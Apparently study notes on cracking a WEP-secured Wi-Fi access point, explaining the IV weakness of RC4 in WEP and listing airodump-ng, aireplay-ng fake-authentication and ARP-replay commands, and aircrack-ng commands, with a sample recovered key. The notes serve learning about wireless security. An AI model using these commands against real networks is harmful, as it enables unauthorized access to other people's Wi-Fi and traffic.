# Cracking the password of AP secured with WEP

## WEP
-   WEP uses algorithm RC4 for data encryption
-   each data is encrypted with unique key
    -   24 bit initialization vector (IV)
    -   IV + key (password) = key stream
    -   key stream + data = encrypted data
    -   IV is shared via packet in plain text
        -   this is the vulnerability, since it is shared in plain text and since the communication on the router will be high, the IV will appear many times. Statistical attack can be easily performed to gain the IV

### WEP cracking of busy network
-   Capture large amount of packets / IVs => tool `airodump-ng`
-   Analyze the captured IVs and crack the key => tool `aircrack-ng`

```bash
airodump-ng --bssid B0:95:75:42:27:E3 --channel 44 --write basic_wep wlan0 # sniff all data (see previous notebook)

aircrack-ng basic_wep-01.cap # crack the password, basic_wep-01.cap is output file from previous command airodump-ng
```

Output of aircrack-ng:
-   Example output: ... KEY FOUND! [ 41:73:32:33 ] (ASCII:As23) ...
-   Password can be used as `As23` or delete the ":" from [ ]: `41733233`

### WEP cracking of not busy network (ARP_replay)
-   Simply force AP to generate mode packets
1.  associate with the AP otherwise the requests will be ignored
    -   simple description: saying to the network "hey I want to communicate with you, don’t ignore me". But still not being authenticated to the network, since we don't know the password yet
2.  wait for ARP packet, capture it and replay it (retransmit it)
    -   This causes AP to produce another packet with the new IV
    -   Keep doing this until enough IVs to crack the key

#### 1st step
```bash
airodump-ng --bssid B0:95:75:42:27:E3 --channel 44 --write arp_replay wlan0 # check the association and sniff all the data, keep it running while to capture all the data on the network
```

- Start second command line and associate with the network

```bash
aireplay-ng --fakeauth 0 -a B0:95:75:42:27:E3 -h 5A:6E:23:9B:29:D8 wlan0 # generate many fakeauth packets to AP (target network)
```

- --fakeauth attack 0 stands for do it only once
- -a target network
- -h MAC address of wireless adapter (`ifconfig` to get the value)

#### 2nd step
```bash
aireplay-ng --arpreplay -b B0:95:75:42:27:E3 -h 5A:6E:23:9B:29:D8 wlan0 # arpreplay attack => wait for the arp packet, when captured, retransmit

aircrack-ng arp_replay-01.cap # crack the password
```

